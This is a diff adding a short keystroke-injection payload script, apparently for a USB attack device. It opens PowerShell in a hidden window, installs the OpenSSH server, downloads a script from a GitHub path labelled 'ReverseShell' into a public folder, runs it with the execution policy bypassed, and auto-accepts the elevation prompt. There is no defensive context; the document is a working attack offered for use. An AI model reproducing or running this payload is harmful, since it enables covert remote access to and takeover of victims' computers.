@@ -1,0 +1,37 @@
+
+DELAY 1000
+GUI R
+DELAY 1000
+STRING powershell.exe
+DELAY 500
+ENTER
+DELAY 3000
+
+
+REM Execute PowerShell command to download and install OpenSSH headlessly
+DELAY 2000
+STRING powershell -WindowStyle Hidden -Command "Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0; Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Jdcruz831/CyberSecurity/main/ReverseShell/server.ps1' -OutFile 'C:\Users\Public\server.ps1';"
+ENTER
+DELAY 20000
+
+
+DELAY 1000
+GUI R
+DELAY 1000
+STRING powershell.exe
+DELAY 500
+ENTER
+DELAY 3000
+
+REM Execute the downloaded script
+STRING powershell -ExecutionPolicy Bypass -File 'C:\Users\Public\server.ps1'
+ENTER
+DELAY 5000
+
+ALT Y
+
+DELAY 1000
+
+REM Close PowerShell
+STRING exit
+ENTER
